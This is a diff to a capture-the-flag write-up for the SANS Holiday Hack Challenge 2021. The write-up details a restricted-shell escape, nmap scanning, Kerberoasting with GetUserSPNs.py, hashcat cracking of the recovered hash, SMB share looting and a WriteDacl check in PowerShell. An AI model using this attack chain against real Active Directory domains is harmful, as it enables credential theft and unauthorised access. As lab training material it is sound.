@@ -28,7 +28,7 @@ We start off this one by registering at the [elfu registration portal](https://r
 After hours and hours and hours of trying different combinations, I discovered that `Ctrl+D` exits to a Python prompt – well I wish I’d tried that earlier!
 
 From the Python prompt I was able to run the following commands to exit to a bash prompt:
-```
+```python
 >>> import subprocess
 >>> out, err = subprocess.Popen(['bash', '-l'], env={}).communicate()
 ```
@@ -62,35 +62,35 @@ Running `nmap` towards the `10.x.x.x` networks with the `-PS22,445` switch as su
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/13e71f00-3f20-4403-b767-931b5fc6f2e8)
 
 Now that I found the domain controller, I should be able to use [Kerbroasting](https://attack.mitre.org/techniques/T1558/003/) to get a password hash.  I start by uploading the script `GetUserSPNs.py`[^1]  using `scp`:
-```
+```python
 > Scp -P 2222 GetUserSPNs.py username@grades.elfu.org:
 ```
 
 I can now run the script on the `grades.elfu.org` machine which is directly connected to the ELFU domain and I can use my own credentials for this:
-```
+```console
 $ Python3 GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/username:'Password!' -request
 ```
 
 Once the script ran, I got a text file; `spns.txt` which contains a hash for user `elfu_svc` and I could copy this back to my  local machine using `scp` once again:
-```
+```python
 > Scp -P 2222 username@grades.elfu.org:/home/username/spns.txt spns.txt
 ```
 
 For the next step I need to crack the hash using [Hashcat](https://hashcat.net/hashcat/).  For this I’ll need a suitable wordlist and a mangling ruleset.  The hints suggest using `Cewl` to generate the wordlist and `OneRuleToRuleThemAll.rule`[^2]  as a mangling rule.  From the enumeration I did earlier on the domain connected machines, I know that the domain password rules expect a password with a minimum length of 7 characters.  So, I can use `cewl` to scrape `https://register.elfu.org/register` for words of suitable length.  I also include the `–with-numbers` switch as recommended by the hints (by looking at the page source we see the names of karaoke groups which look a bit like potential passwords and include numbers in them).
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/4a478247-50e0-46d3-84ad-045b65308d12)
-```
+```console
 $ cewl -m 7 -w custom_wordlist.txt –with-numbers https://register.elfu.org/register
 ```
 
 Now I run `hashcat` with the generated wordlist:
-```
+```console
 $ hashcat -m 13100 -a 0 spns.txt –potfile-disable -r OneRuleToRuleThemAll.rule –force -O -w 4 –opencl-device-types 1,2 custom_wordlist.txt
 ```
 
 Once hashcat finishes cracking the hash I find out that the user `elfu_svc` has password `Snow2021!` 😊
 
 I can use these new credentials now to connect to the BDC server and see what shares are available on it:
-```
+```console
 $ rpcclient -U elfu_svc 10.128.3.30 -c netshareenum
 ```
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/91857eb5-5daa-4782-8e4e-2bf93b9ca39d)
@@ -98,13 +98,13 @@ $ rpcclient -U elfu_svc 10.128.3.30 -c netshareenum
 I see that there are 4 shares available; `netlogon`, `sysvol`, `elfu_svc_shr` and `research_dep`.
 I can access all of these apart from `research_dep`.   On the other hand, `elfu_svc_shr` is the only share I have access to that has any files on it.  
 I can access this share and download all the files in a tar archive:
-```
+```console
 $ smbclient -U elfu_svc //10.128.3.30/elfu_svc_shr
 smb: \> tar c all.tar
 ```
 
 Now I can untar the file and search through the contents[^3]:
-```
+```console
 $ tar -xvf all.tar
 $ grep -l remote_elf   
 ```
@@ -116,7 +116,7 @@ Looking through the script I can see that is actually using `remote_elf`’s cre
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/e028cee7-b23c-4fb8-9a58-f6f2cd0ed613)
 
 Now I hope (or expect, given the hints in this challenge so far) that `remote_elf` has been given `WriteDacl` rights to a group that is of interest to us.  After some trial-and-error I find that `remote_elf` does indeed have `WriteDacl` enabled for the group `Research Department`.  This is verified by running the following at the powershell prompt:
-```
+```powershell
 $ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
 $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
 ```
